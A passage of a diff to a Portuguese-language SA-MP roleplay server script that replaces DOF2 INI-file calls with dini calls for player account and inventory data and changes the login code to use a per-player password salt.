+	pInfo[playerid][Medicamentos] = dini_Int(ficheiro, "Medicamentos");
+	pInfo[playerid][MedicamentosTomados] = dini_Int(ficheiro, "MedicamentosTomados");
+	pInfo[playerid][ReceitaMedica] = dini_Int(ficheiro, "ReceitaMedica");
+	pInfo[playerid][Morto] = dini_Int(ficheiro, "Morto");
+	pInfo[playerid][MorteX] = dini_Float(ficheiro, "MorteX");
+	pInfo[playerid][MorteY] = dini_Float(ficheiro, "MorteY");
+	pInfo[playerid][MorteZ] = dini_Float(ficheiro, "MorteZ");
+	pInfo[playerid][MorteVirtualWorld] = dini_Int(ficheiro, "MorteVirtualWorld");
+	pInfo[playerid][MorteInterior] = dini_Int(ficheiro, "MorteInterior");
+	pInfo[playerid][Euro1] = dini_Int(ficheiro, "Euro1");
+	pInfo[playerid][Euro2] = dini_Int(ficheiro, "Euro2");
+	pInfo[playerid][Euro3] = dini_Int(ficheiro, "Euro3");
+	pInfo[playerid][Euro4] = dini_Int(ficheiro, "Euro4");
+	pInfo[playerid][Euro5] = dini_Int(ficheiro, "Euro5");
+	pInfo[playerid][BilheteEuro] = dini_Int(ficheiro, "BilheteEuro");
+	pInfo[playerid][Estrela1] = dini_Int(ficheiro, "Estrela1");
+	pInfo[playerid][Estrela2] = dini_Int(ficheiro, "Estrela2");
+	pInfo[playerid][Codigo] = dini_Int(ficheiro, "Codigo");
+	pInfo[playerid][Rotas] = dini_Int(ficheiro, "Rotas");
+	pInfo[playerid][EmpregoNivel] = dini_Int(ficheiro, "EmpregoNivel");
+	pInfo[playerid][TempoRota] = dini_Int(ficheiro, "TempoRota");
+	pInfo[playerid][CC] = dini_Int(ficheiro, "CC");
+	pInfo[playerid][Seguradora] = dini_Int(ficheiro, "Seguradora");
+	pInfo[playerid][MensalidadeSeguradora] = dini_Int(ficheiro, "MensalidadeSeguradora");
+	pInfo[playerid][SeguradoraCount] = dini_Int(ficheiro, "SeguradoraCount");
+	pInfo[playerid][SeguradoraPayCount] = dini_Int(ficheiro, "SeguradoraPayCount");
+	pInfo[playerid][Golds] = dini_Int(ficheiro, "Golds");
+	pInfo[playerid][Viciado] = dini_Int(ficheiro, "Viciado");
+	pInfo[playerid][TempoViciado] = dini_Int(ficheiro, "TempoViciado");
+	pInfo[playerid][ADesentoxicar] = dini_Int(ficheiro, "ADesentoxicar");
+	pInfo[playerid][NumeroTelemovel] = dini_Int(ficheiro, "NumeroTelemovel");
+	pInfo[playerid][Rede] = dini_Int(ficheiro, "Rede");
+	pInfo[playerid][Saldo] = dini_Int(ficheiro, "Saldo");
+	pInfo[playerid][TutFalhado] = dini_Int(ficheiro, "TutFalhado");
+	pInfo[playerid][LicPesca] = dini_Int(ficheiro, "LicPesca");
+	pInfo[playerid][Colete] = dini_Int(ficheiro, "Colete");
+	pInfo[playerid][Suspeito] = dini_Int(ficheiro, "Suspeito");
+	pInfo[playerid][VezesSuspeito] = dini_Int(ficheiro, "VezesSuspeito");
+	pInfo[playerid][VezesPreso] = dini_Int(ficheiro, "VezesPreso");
+	pInfo[playerid][Kicks] = dini_Int(ficheiro, "Kicks");
+
     format(ficheiro, sizeof(ficheiro), "PCRP/Objetos/%s.ini", name);
-    
-    DOF2_CreateFile(ficheiro);
-    
-    DOF2_SetInt(ficheiro, "Mala", 0);
-    DOF2_SetInt(ficheiro, "Mochila", 1);
-    DOF2_SetInt(ficheiro, "Arma1Mala", 0);
-    DOF2_SetInt(ficheiro, "Ammo1Mala", 0);
-    DOF2_SetInt(ficheiro, "Arma2Mala", 0);
-    DOF2_SetInt(ficheiro, "Ammo2Mala", 0);
-    DOF2_SetInt(ficheiro, "Arma3Mala", 0);
-    DOF2_SetInt(ficheiro, "Ammo3Mala", 0);
-    DOF2_SetInt(ficheiro, "Arma4Mala", 0);
-    DOF2_SetInt(ficheiro, "Ammo4Mala", 0);
-    DOF2_SetInt(ficheiro, "Telemovel", 0);
-    DOF2_SetInt(ficheiro, "o_2054", 0);
-    DOF2_SetInt(ficheiro, "o_18639", 0);
-    DOF2_SetInt(ficheiro, "o_18943", 0);
-    DOF2_SetInt(ficheiro, "o_2053", 0);
-    DOF2_SetInt(ficheiro, "o_2052", 0);
-    DOF2_SetInt(ficheiro, "o_19160", 0);
-    DOF2_SetInt(ficheiro, "o_18940", 0);
-    DOF2_SetInt(ficheiro, "o_18941", 0);
-    DOF2_SetInt(ficheiro, "o_19011", 0);
-    DOF2_SetInt(ficheiro, "o_19006", 0);
-    DOF2_SetInt(ficheiro, "o_19027", 0);
-    DOF2_SetInt(ficheiro, "o_19007", 0);
-    DOF2_SetInt(ficheiro, "o_19008", 0);
-    DOF2_SetInt(ficheiro, "o_19009", 0);
-    DOF2_SetInt(ficheiro, "o_19010", 0);
-    DOF2_SetInt(ficheiro, "o_19011", 0);
-    DOF2_SetInt(ficheiro, "o_19012", 0);
-    DOF2_SetInt(ficheiro, "o_19013", 0);
-    DOF2_SetInt(ficheiro, "o_19014", 0);
-    DOF2_SetInt(ficheiro, "o_19015", 0);
-    DOF2_SetInt(ficheiro, "o_19016", 0);
-    DOF2_SetInt(ficheiro, "o_19017", 0);
-    DOF2_SetInt(ficheiro, "o_19018", 0);
-    DOF2_SetInt(ficheiro, "Radio", 0);
-    DOF2_SetInt(ficheiro, "Arma1Mochila", 0);
-    DOF2_SetInt(ficheiro, "Ammo1Mochila", 0);
-    DOF2_SetInt(ficheiro, "Arma2Mochila", 0);
-    DOF2_SetInt(ficheiro, "Ammo2Mochila", 0);
-    DOF2_SetInt(ficheiro, "Arma3Mochila", 0);
-    DOF2_SetInt(ficheiro, "Ammo3Mochila", 0);
-    DOF2_SetInt(ficheiro, "Arma4Mochila", 0);
-    DOF2_SetInt(ficheiro, "Ammo4Mochila", 0);
-    DOF2_SetInt(ficheiro, "Bidom", 0);
-    DOF2_SetInt(ficheiro, "ListaTel", 0);
-    DOF2_SetInt(ficheiro, "Mascara", 0);
-    DOF2_SetInt(ficheiro, "Corda", 0);
-    DOF2_SetInt(ficheiro, "Venda", 0);
-    DOF2_SetInt(ficheiro, "Capacete", 0);
-    DOF2_SetInt(ficheiro, "CanaDePesca", 0);
-    DOF2_SetInt(ficheiro, "WalkieTalkie", 0);
-    DOF2_SetInt(ficheiro, "WalkieTalkieFreq", 0);
-    DOF2_SetInt(ficheiro, "Peixe_Corvina", 0);
-    DOF2_SetInt(ficheiro, "Peixe_Congro", 0);
-    DOF2_SetInt(ficheiro, "Peixe_Robalo", 0);
-    DOF2_SetInt(ficheiro, "Peixe_Sargo", 0);
-    DOF2_SetInt(ficheiro, "Peixe_Goraz", 0);
-    DOF2_SetInt(ficheiro, "Peixe_Cavala", 0);
-    DOF2_SetInt(ficheiro, "Peixe_Dourada", 0);
-    DOF2_SetInt(ficheiro, "Peixe_Espada", 0);
-    DOF2_SetInt(ficheiro, "Isco", 0);
-    DOF2_SetInt(ficheiro, "Colete", 0);
-    
-    DOF2_SaveFile();
-    
+
+    dini_Create(ficheiro);
+
+    dini_IntSet(ficheiro, "Mala", 0);
+    dini_IntSet(ficheiro, "Mochila", 1);
+    dini_IntSet(ficheiro, "Arma1Mala", 0);
+    dini_IntSet(ficheiro, "Ammo1Mala", 0);
+    dini_IntSet(ficheiro, "Arma2Mala", 0);
+    dini_IntSet(ficheiro, "Ammo2Mala", 0);
+    dini_IntSet(ficheiro, "Arma3Mala", 0);
+    dini_IntSet(ficheiro, "Ammo3Mala", 0);
+    dini_IntSet(ficheiro, "Arma4Mala", 0);
+    dini_IntSet(ficheiro, "Ammo4Mala", 0);
+    dini_IntSet(ficheiro, "Telemovel", 0);
+    dini_IntSet(ficheiro, "o_2054", 0);
+    dini_IntSet(ficheiro, "o_18639", 0);
+    dini_IntSet(ficheiro, "o_18943", 0);
+    dini_IntSet(ficheiro, "o_2053", 0);
+    dini_IntSet(ficheiro, "o_2052", 0);
+    dini_IntSet(ficheiro, "o_19160", 0);
+    dini_IntSet(ficheiro, "o_18940", 0);
+    dini_IntSet(ficheiro, "o_18941", 0);
+    dini_IntSet(ficheiro, "o_19011", 0);
+    dini_IntSet(ficheiro, "o_19006", 0);
+    dini_IntSet(ficheiro, "o_19027", 0);
+    dini_IntSet(ficheiro, "o_19007", 0);
+    dini_IntSet(ficheiro, "o_19008", 0);
+    dini_IntSet(ficheiro, "o_19009", 0);
+    dini_IntSet(ficheiro, "o_19010", 0);
+    dini_IntSet(ficheiro, "o_19011", 0);
+    dini_IntSet(ficheiro, "o_19012", 0);
+    dini_IntSet(ficheiro, "o_19013", 0);
+    dini_IntSet(ficheiro, "o_19014", 0);
+    dini_IntSet(ficheiro, "o_19015", 0);
+    dini_IntSet(ficheiro, "o_19016", 0);
+    dini_IntSet(ficheiro, "o_19017", 0);
+    dini_IntSet(ficheiro, "o_19018", 0);
+    dini_IntSet(ficheiro, "Radio", 0);
+    dini_IntSet(ficheiro, "Arma1Mochila", 0);
+    dini_IntSet(ficheiro, "Ammo1Mochila", 0);
+    dini_IntSet(ficheiro, "Arma2Mochila", 0);
+    dini_IntSet(ficheiro, "Ammo2Mochila", 0);
+    dini_IntSet(ficheiro, "Arma3Mochila", 0);
+    dini_IntSet(ficheiro, "Ammo3Mochila", 0);
+    dini_IntSet(ficheiro, "Arma4Mochila", 0);
+    dini_IntSet(ficheiro, "Ammo4Mochila", 0);
+    dini_IntSet(ficheiro, "Bidom", 0);
+    dini_IntSet(ficheiro, "ListaTel", 0);
+    dini_IntSet(ficheiro, "Mascara", 0);
+    dini_IntSet(ficheiro, "Corda", 0);
+    dini_IntSet(ficheiro, "Venda", 0);
+    dini_IntSet(ficheiro, "Capacete", 0);
+    dini_IntSet(ficheiro, "CanaDePesca", 0);
+    dini_IntSet(ficheiro, "WalkieTalkie", 0);
+    dini_IntSet(ficheiro, "WalkieTalkieFreq", 0);
+    dini_IntSet(ficheiro, "Peixe_Corvina", 0);
+    dini_IntSet(ficheiro, "Peixe_Congro", 0);
+    dini_IntSet(ficheiro, "Peixe_Robalo", 0);
+    dini_IntSet(ficheiro, "Peixe_Sargo", 0);
+    dini_IntSet(ficheiro, "Peixe_Goraz", 0);
+    dini_IntSet(ficheiro, "Peixe_Cavala", 0);
+    dini_IntSet(ficheiro, "Peixe_Dourada", 0);
+    dini_IntSet(ficheiro, "Peixe_Espada", 0);
+    dini_IntSet(ficheiro, "Isco", 0);
+    dini_IntSet(ficheiro, "Colete", 0);
+
     format(ficheiro, sizeof(ficheiro), "PCRP/Amigos/%s.ini", name);
-    
-    DOF2_CreateFile(ficheiro);
-    DOF2_SaveFile();
-    
+
+    dini_Create(ficheiro);
+
     pInfo[playerid][Vida] = 50;
-    
+
 	return 1;
 }
 
@@ -10983,179 +10991,182 @@ public LogarJogador(playerid, password[])
 
 	new name[MAX_PLAYER_NAME];
     GetPlayerName(playerid, name, sizeof(name));
-    
-    SHA256_PassHash(pw, PW_SALT, cryptedpw, sizeof cryptedpw);
-    
+
    	format(ficheiro, sizeof(ficheiro), "PCRP/Contas/%s.ini", name);
-	format(pInfo[playerid][Key], 256, "%s", DOF2_GetString(ficheiro, "Key"));
- 	
+	format(pInfo[playerid][Key], 256, "%s", dini_Get(ficheiro, "Key"));
+	pInfo[playerid][UID] = dini_Int(ficheiro, "UID");
+	format(pInfo[playerid][RegDay], 32, "%s", dini_Get(ficheiro, "RegDay"));
+
+	SHA256_PassHash(pw, GeneratePasswordSalt(pInfo[playerid][UID], pInfo[playerid][RegDay]), cryptedpw, sizeof cryptedpw);
+
  	if(BadLoginCounter[playerid] >= 3)
  	{
 		return KickPlayer(playerid, "Doge", "Errou a password 3 vezes");
  	}
- 	
+
     if(!strcmp(pInfo[playerid][Key], cryptedpw) && strlen(cryptedpw) != 0)
     {
 	    pInfo[playerid][Key] = cryptedpw;
-	    pInfo[playerid][Banido] = DOF2_GetInt(ficheiro, "Banido");
-	    pInfo[playerid][UID] = DOF2_GetInt(ficheiro, "UID");
-	    pInfo[playerid][Vida] = DOF2_GetFloat(ficheiro, "Vida");
-	    pInfo[playerid][Level] = DOF2_GetInt(ficheiro, "Level");
-	    pInfo[playerid][Skin] = DOF2_GetInt(ficheiro, "Skin");
-	    pInfo[playerid][Admin] = DOF2_GetInt(ficheiro, "Admin");
-	    pInfo[playerid][Emprego] = DOF2_GetInt(ficheiro, "Emprego");
-	    pInfo[playerid][Faction] = DOF2_GetInt(ficheiro, "Faction");
-	    pInfo[playerid][FactionRank] = DOF2_GetInt(ficheiro, "FactionRank");
-	    pInfo[playerid][AJCounter] = DOF2_GetInt(ficheiro, "AJCounter");
-	    format(pInfo[playerid][RegDay], 32, "%s", DOF2_GetString(ficheiro, "RegDay"));
-	    pInfo[playerid][Origem] = DOF2_GetInt(ficheiro, "Origem");
-	    pInfo[playerid][Sexo] = DOF2_GetInt(ficheiro, "Sexo");
-	    pInfo[playerid][Idade] = DOF2_GetInt(ficheiro, "Idade");
- 	   	pInfo[playerid][Registado] = DOF2_GetInt(ficheiro, "Registado");
- 	   	pInfo[playerid][TutFeito] = DOF2_GetInt(ficheiro, "TutFeito");
- 	   	pInfo[playerid][Money] = DOF2_GetInt(ficheiro, "Money");
-		pInfo[playerid][Bank] = DOF2_GetInt(ficheiro, "Bank");
-		pInfo[playerid][ChaveBiz] = DOF2_GetInt(ficheiro, "ChaveBiz");
-		pInfo[playerid][ChaveCasa] = DOF2_GetInt(ficheiro, "ChaveCasa");
-		pInfo[playerid][ChaveCasaAlugada] = DOF2_GetInt(ficheiro, "ChaveCasaAlugada");
- 	   	pInfo[playerid][ChaveCarro1] = DOF2_GetInt(ficheiro, "ChaveCarro1");
- 	   	pInfo[playerid][ChaveCarro2] = DOF2_GetInt(ficheiro, "ChaveCarro2");
-  	   	pInfo[playerid][ChaveCarro3] = DOF2_GetInt(ficheiro, "ChaveCarro3");
- 	   	pInfo[playerid][ChaveCarro4] = DOF2_GetInt(ficheiro, "ChaveCarro4");
-   	   	pInfo[playerid][ChaveCarroEmp1] = DOF2_GetInt(ficheiro, "ChaveCarroEmp1");
- 	   	pInfo[playerid][ChaveCarroEmp2] = DOF2_GetInt(ficheiro, "ChaveCarroEmp2");
-  	   	pInfo[playerid][ChaveCarroEmp3] = DOF2_GetInt(ficheiro, "ChaveCarroEmp3");
- 	   	pInfo[playerid][ChaveCarroEmp4] = DOF2_GetInt(ficheiro, "ChaveCarroEmp4");
- 	   	pInfo[playerid][Minutos] = DOF2_GetInt(ficheiro, "Minutos");
- 	   	pInfo[playerid][PreDrogas] = DOF2_GetInt(ficheiro, "PreDrogas");
- 	   	pInfo[playerid][PreMateriais] = DOF2_GetInt(ficheiro, "PreMateriais");
- 	   	pInfo[playerid][Drogas] = DOF2_GetInt(ficheiro, "Drogas");
- 	   	pInfo[playerid][Materiais] = DOF2_GetInt(ficheiro, "Materiais");
- 	   	pInfo[playerid][CartaLig] = DOF2_GetInt(ficheiro, "CartaLig");
- 	   	pInfo[playerid][CartaMota] = DOF2_GetInt(ficheiro, "CartaMota");
- 	   	pInfo[playerid][CartaPesados] = DOF2_GetInt(ficheiro, "CartaPesados");
- 	   	pInfo[playerid][CartaBarco] = DOF2_GetInt(ficheiro, "CartaBarco");
- 	   	pInfo[playerid][LicArmas] = DOF2_GetInt(ficheiro, "LicArmas");
- 	   	pInfo[playerid][Multas] = DOF2_GetInt(ficheiro, "Multas");
- 	   	pInfo[playerid][Jailed] = DOF2_GetInt(ficheiro, "Jailed");
- 	   	pInfo[playerid][JailTime] = DOF2_GetInt(ficheiro, "JailTime");
- 	   	pInfo[playerid][Preso] = DOF2_GetInt(ficheiro, "Preso");
- 	   	pInfo[playerid][PresoTempo] = DOF2_GetInt(ficheiro, "PresoTempo");
- 	   	pInfo[playerid][XP] = DOF2_GetInt(ficheiro, "XP");
- 	   	pInfo[playerid][Meses] = DOF2_GetInt(ficheiro, "Meses");
- 	   	pInfo[playerid][Doenca] = DOF2_GetInt(ficheiro, "Doenca");
- 	   	pInfo[playerid][Medicamentos] = DOF2_GetInt(ficheiro, "Medicamentos");
- 	   	pInfo[playerid][MedicamentosTomados] = DOF2_GetInt(ficheiro, "MedicamentosTomados");
- 	   	pInfo[playerid][ReceitaMedica] = DOF2_GetInt(ficheiro, "ReceitaMedica");
- 	   	pInfo[playerid][Morto] = DOF2_GetInt(ficheiro, "Morto");
- 	   	pInfo[playerid][MorteX] = DOF2_GetFloat(ficheiro, "MorteX");
- 	   	pInfo[playerid][MorteY] = DOF2_GetFloat(ficheiro, "MorteY");
- 	   	pInfo[playerid][MorteZ] = DOF2_GetFloat(ficheiro, "MorteZ");
- 	   	pInfo[playerid][MorteVirtualWorld] = DOF2_GetInt(ficheiro, "MorteVirtualWorld");
- 	   	pInfo[playerid][MorteInterior] = DOF2_GetInt(ficheiro, "MorteInterior");
- 	   	pInfo[playerid][Euro1] = DOF2_GetInt(ficheiro, "Euro1");
- 	   	pInfo[playerid][Euro2] = DOF2_GetInt(ficheiro, "Euro2");
- 	   	pInfo[playerid][Euro3] = DOF2_GetInt(ficheiro, "Euro3");
- 	   	pInfo[playerid][Euro4] = DOF2_GetInt(ficheiro, "Euro4");
- 	   	pInfo[playerid][Euro5] = DOF2_GetInt(ficheiro, "Euro5");
- 	   	pInfo[playerid][BilheteEuro] = DOF2_GetInt(ficheiro, "BilheteEuro");
- 	   	pInfo[playerid][Estrela1] = DOF2_GetInt(ficheiro, "Estrela1");
- 	   	pInfo[playerid][Estrela2] = DOF2_GetInt(ficheiro, "Estrela2");
- 	   	pInfo[playerid][Codigo] = DOF2_GetInt(ficheiro, "Codigo");
- 	   	pInfo[playerid][Rotas] = DOF2_GetInt(ficheiro, "Rotas");
- 	   	pInfo[playerid][EmpregoNivel] = DOF2_GetInt(ficheiro, "EmpregoNivel");
- 	   	pInfo[playerid][TempoRota] = DOF2_GetInt(ficheiro, "TempoRota");
- 	   	pInfo[playerid][CC] = DOF2_GetInt(ficheiro, "CC");
- 	   	pInfo[playerid][Seguradora] = DOF2_GetInt(ficheiro, "Seguradora");
- 	   	pInfo[playerid][MensalidadeSeguradora] = DOF2_GetInt(ficheiro, "MensalidadeSeguradora");
- 	   	pInfo[playerid][SeguradoraCount] = DOF2_GetInt(ficheiro, "SeguradoraCount");
- 	   	pInfo[playerid][SeguradoraPayCount] = DOF2_GetInt(ficheiro, "SeguradoraPayCount");
- 	   	pInfo[playerid][Golds] = DOF2_GetInt(ficheiro, "Golds");
- 	   	pInfo[playerid][Viciado] = DOF2_GetInt(ficheiro, "Viciado");
- 	   	pInfo[playerid][TempoViciado] = DOF2_GetInt(ficheiro, "TempoViciado");
- 	   	pInfo[playerid][ADesentoxicar] = DOF2_GetInt(ficheiro, "ADesentoxicar");
-  	   	pInfo[playerid][NumeroTelemovel] = DOF2_GetInt(ficheiro, "NumeroTelemovel");
- 	   	pInfo[playerid][Rede] = DOF2_GetInt(ficheiro, "Rede");
- 	   	pInfo[playerid][Saldo] = DOF2_GetInt(ficheiro, "Saldo");
- 	   	pInfo[playerid][TutFalhado] = DOF2_GetInt(ficheiro, "TutFalhado");
- 	   	pInfo[playerid][LicPesca] = DOF2_GetInt(ficheiro, "LicPesca");
- 	   	pInfo[playerid][Colete] = DOF2_GetInt(ficheiro, "Colete");
- 	   	pInfo[playerid][SpawnX] = DOF2_GetFloat(ficheiro, "SpawnX");
- 	   	pInfo[playerid][SpawnY] = DOF2_GetFloat(ficheiro, "SpawnY");
- 	   	pInfo[playerid][SpawnZ] = DOF2_GetFloat(ficheiro, "SpawnZ");
- 	   	pInfo[playerid][SpawnVirtualWorld] = DOF2_GetInt(ficheiro, "SpawnVirtualWorld");
- 	   	pInfo[playerid][SpawnInterior] = DOF2_GetInt(ficheiro, "SpawnInterior");
- 	   	pInfo[playerid][Suspeito] = DOF2_GetInt(ficheiro, "Suspeito");
-  	   	pInfo[playerid][VezesSuspeito] = DOF2_GetInt(ficheiro, "VezesSuspeito");
- 	   	pInfo[playerid][VezesPreso] = DOF2_GetInt(ficheiro, "VezesPreso");
- 	   	
+	    pInfo[playerid][Banido] = dini_Int(ficheiro, "Banido");
+	    pInfo[playerid][UID] = dini_Int(ficheiro, "UID");
+	    pInfo[playerid][Vida] = dini_Float(ficheiro, "Vida");
+	    pInfo[playerid][Level] = dini_Int(ficheiro, "Level");
+	    pInfo[playerid][Skin] = dini_Int(ficheiro, "Skin");
+	    pInfo[playerid][Admin] = dini_Int(ficheiro, "Admin");
+	    pInfo[playerid][Emprego] = dini_Int(ficheiro, "Emprego");
+	    pInfo[playerid][Faction] = dini_Int(ficheiro, "Faction");
+	    pInfo[playerid][FactionRank] = dini_Int(ficheiro, "FactionRank");
+	    pInfo[playerid][AJCounter] = dini_Int(ficheiro, "AJCounter");
+	    format(pInfo[playerid][RegDay], 32, "%s", dini_Get(ficheiro, "RegDay"));
+	    pInfo[playerid][Origem] = dini_Int(ficheiro, "Origem");
+	    pInfo[playerid][Sexo] = dini_Int(ficheiro, "Sexo");
+	    pInfo[playerid][Idade] = dini_Int(ficheiro, "Idade");
+ 	   	pInfo[playerid][Registado] = dini_Int(ficheiro, "Registado");
+ 	   	pInfo[playerid][TutFeito] = dini_Int(ficheiro, "TutFeito");
+ 	   	pInfo[playerid][Money] = dini_Int(ficheiro, "Money");
+		pInfo[playerid][Bank] = dini_Int(ficheiro, "Bank");
+		pInfo[playerid][ChaveBiz] = dini_Int(ficheiro, "ChaveBiz");
+		pInfo[playerid][ChaveCasa] = dini_Int(ficheiro, "ChaveCasa");
+		pInfo[playerid][ChaveCasaAlugada] = dini_Int(ficheiro, "ChaveCasaAlugada");
+ 	   	pInfo[playerid][ChaveCarro1] = dini_Int(ficheiro, "ChaveCarro1");
+ 	   	pInfo[playerid][ChaveCarro2] = dini_Int(ficheiro, "ChaveCarro2");
+  	   	pInfo[playerid][ChaveCarro3] = dini_Int(ficheiro, "ChaveCarro3");
+ 	   	pInfo[playerid][ChaveCarro4] = dini_Int(ficheiro, "ChaveCarro4");
+   	   	pInfo[playerid][ChaveCarroEmp1] = dini_Int(ficheiro, "ChaveCarroEmp1");
+ 	   	pInfo[playerid][ChaveCarroEmp2] = dini_Int(ficheiro, "ChaveCarroEmp2");
+  	   	pInfo[playerid][ChaveCarroEmp3] = dini_Int(ficheiro, "ChaveCarroEmp3");
+ 	   	pInfo[playerid][ChaveCarroEmp4] = dini_Int(ficheiro, "ChaveCarroEmp4");
+ 	   	pInfo[playerid][Minutos] = dini_Int(ficheiro, "Minutos");
+ 	   	pInfo[playerid][PreDrogas] = dini_Int(ficheiro, "PreDrogas");
+ 	   	pInfo[playerid][PreMateriais] = dini_Int(ficheiro, "PreMateriais");
+ 	   	pInfo[playerid][Drogas] = dini_Int(ficheiro, "Drogas");
+ 	   	pInfo[playerid][Materiais] = dini_Int(ficheiro, "Materiais");
+ 	   	pInfo[playerid][CartaLig] = dini_Int(ficheiro, "CartaLig");
+ 	   	pInfo[playerid][CartaMota] = dini_Int(ficheiro, "CartaMota");
+ 	   	pInfo[playerid][CartaPesados] = dini_Int(ficheiro, "CartaPesados");
+ 	   	pInfo[playerid][CartaBarco] = dini_Int(ficheiro, "CartaBarco");
+ 	   	pInfo[playerid][LicArmas] = dini_Int(ficheiro, "LicArmas");
+ 	   	pInfo[playerid][Multas] = dini_Int(ficheiro, "Multas");
+ 	   	pInfo[playerid][Jailed] = dini_Int(ficheiro, "Jailed");
+ 	   	pInfo[playerid][JailTime] = dini_Int(ficheiro, "JailTime");
+ 	   	pInfo[playerid][Preso] = dini_Int(ficheiro, "Preso");
+ 	   	pInfo[playerid][PresoTempo] = dini_Int(ficheiro, "PresoTempo");
+ 	   	pInfo[playerid][XP] = dini_Int(ficheiro, "XP");
+ 	   	pInfo[playerid][Meses] = dini_Int(ficheiro, "Meses");
+ 	   	pInfo[playerid][Doenca] = dini_Int(ficheiro, "Doenca");
+ 	   	pInfo[playerid][Medicamentos] = dini_Int(ficheiro, "Medicamentos");
+ 	   	pInfo[playerid][MedicamentosTomados] = dini_Int(ficheiro, "MedicamentosTomados");
+ 	   	pInfo[playerid][ReceitaMedica] = dini_Int(ficheiro, "ReceitaMedica");
+ 	   	pInfo[playerid][Morto] = dini_Int(ficheiro, "Morto");
+ 	   	pInfo[playerid][MorteX] = dini_Float(ficheiro, "MorteX");
+ 	   	pInfo[playerid][MorteY] = dini_Float(ficheiro, "MorteY");
+ 	   	pInfo[playerid][MorteZ] = dini_Float(ficheiro, "MorteZ");
+ 	   	pInfo[playerid][MorteVirtualWorld] = dini_Int(ficheiro, "MorteVirtualWorld");
+ 	   	pInfo[playerid][MorteInterior] = dini_Int(ficheiro, "MorteInterior");
+ 	   	pInfo[playerid][Euro1] = dini_Int(ficheiro, "Euro1");
+ 	   	pInfo[playerid][Euro2] = dini_Int(ficheiro, "Euro2");
+ 	   	pInfo[playerid][Euro3] = dini_Int(ficheiro, "Euro3");
+ 	   	pInfo[playerid][Euro4] = dini_Int(ficheiro, "Euro4");
+ 	   	pInfo[playerid][Euro5] = dini_Int(ficheiro, "Euro5");
+ 	   	pInfo[playerid][BilheteEuro] = dini_Int(ficheiro, "BilheteEuro");
+ 	   	pInfo[playerid][Estrela1] = dini_Int(ficheiro, "Estrela1");
+ 	   	pInfo[playerid][Estrela2] = dini_Int(ficheiro, "Estrela2");
+ 	   	pInfo[playerid][Codigo] = dini_Int(ficheiro, "Codigo");
+ 	   	pInfo[playerid][Rotas] = dini_Int(ficheiro, "Rotas");
+ 	   	pInfo[playerid][EmpregoNivel] = dini_Int(ficheiro, "EmpregoNivel");
+ 	   	pInfo[playerid][TempoRota] = dini_Int(ficheiro, "TempoRota");
+ 	   	pInfo[playerid][CC] = dini_Int(ficheiro, "CC");
+ 	   	pInfo[playerid][Seguradora] = dini_Int(ficheiro, "Seguradora");
+ 	   	pInfo[playerid][MensalidadeSeguradora] = dini_Int(ficheiro, "MensalidadeSeguradora");
+ 	   	pInfo[playerid][SeguradoraCount] = dini_Int(ficheiro, "SeguradoraCount");
+ 	   	pInfo[playerid][SeguradoraPayCount] = dini_Int(ficheiro, "SeguradoraPayCount");
+ 	   	pInfo[playerid][Golds] = dini_Int(ficheiro, "Golds");
+ 	   	pInfo[playerid][Viciado] = dini_Int(ficheiro, "Viciado");
+ 	   	pInfo[playerid][TempoViciado] = dini_Int(ficheiro, "TempoViciado");
+ 	   	pInfo[playerid][ADesentoxicar] = dini_Int(ficheiro, "ADesentoxicar");
+  	   	pInfo[playerid][NumeroTelemovel] = dini_Int(ficheiro, "NumeroTelemovel");
+ 	   	pInfo[playerid][Rede] = dini_Int(ficheiro, "Rede");
+ 	   	pInfo[playerid][Saldo] = dini_Int(ficheiro, "Saldo");
+ 	   	pInfo[playerid][TutFalhado] = dini_Int(ficheiro, "TutFalhado");
+ 	   	pInfo[playerid][LicPesca] = dini_Int(ficheiro, "LicPesca");
+ 	   	pInfo[playerid][Colete] = dini_Int(ficheiro, "Colete");
+ 	   	pInfo[playerid][SpawnX] = dini_Float(ficheiro, "SpawnX");
+ 	   	pInfo[playerid][SpawnY] = dini_Float(ficheiro, "SpawnY");
+ 	   	pInfo[playerid][SpawnZ] = dini_Float(ficheiro, "SpawnZ");
+ 	   	pInfo[playerid][SpawnVirtualWorld] = dini_Int(ficheiro, "SpawnVirtualWorld");
+ 	   	pInfo[playerid][SpawnInterior] = dini_Int(ficheiro, "SpawnInterior");
+ 	   	pInfo[playerid][Crashou] = dini_Int(ficheiro, "Crashou");
+ 	   	pInfo[playerid][Suspeito] = dini_Int(ficheiro, "Suspeito");
+  	   	pInfo[playerid][VezesSuspeito] = dini_Int(ficheiro, "VezesSuspeito");
+ 	   	pInfo[playerid][VezesPreso] = dini_Int(ficheiro, "VezesPreso");
+ 	   	pInfo[playerid][Kicks] = dini_Int(ficheiro, "Kicks");
 
  	   	format(ficheiro, sizeof(ficheiro), "PCRP/Objetos/%s.ini", name);
- 	   	
- 	   	pObjects[playerid][Mala] = DOF2_GetInt(ficheiro, "Mala");
- 	   	pObjects[playerid][Mochila] = DOF2_GetInt(ficheiro, "Mochila");
- 	   	pObjects[playerid][Arma1Mala] = DOF2_GetInt(ficheiro, "Arma1Mala");
- 	   	pObjects[playerid][Ammo1Mala] = DOF2_GetInt(ficheiro, "Ammo1Mala");
- 	   	pObjects[playerid][Arma2Mala] = DOF2_GetInt(ficheiro, "Arma2Mala");
- 	   	pObjects[playerid][Ammo2Mala] = DOF2_GetInt(ficheiro, "Ammo2Mala");
- 	   	pObjects[playerid][Arma3Mala] = DOF2_GetInt(ficheiro, "Arma3Mala");
- 	   	pObjects[playerid][Ammo3Mala] = DOF2_GetInt(ficheiro, "Ammo3Mala");
- 	   	pObjects[playerid][Arma4Mala] = DOF2_GetInt(ficheiro, "Arma4Mala");
- 	   	pObjects[playerid][Ammo4Mala] = DOF2_GetInt(ficheiro, "Ammo4Mala");
- 	   	pObjects[playerid][Telemovel] = DOF2_GetInt(ficheiro, "Telemovel");
- 	   	pObjects[playerid][o_2054] = DOF2_GetInt(ficheiro, "o_2054");
- 	   	pObjects[playerid][o_18639] = DOF2_GetInt(ficheiro, "o_18639");
- 	   	pObjects[playerid][o_18943] = DOF2_GetInt(ficheiro, "o_18943");
- 	   	pObjects[playerid][o_2053] = DOF2_GetInt(ficheiro, "o_2053");
- 	   	pObjects[playerid][o_2052] = DOF2_GetInt(ficheiro, "o_2052");
- 	   	pObjects[playerid][o_19160] = DOF2_GetInt(ficheiro, "o_19160");
- 	   	pObjects[playerid][o_18940] = DOF2_GetInt(ficheiro, "o_18940");
- 	   	pObjects[playerid][o_18941] = DOF2_GetInt(ficheiro, "o_18941");
- 	   	pObjects[playerid][o_19011] = DOF2_GetInt(ficheiro, "o_19011");
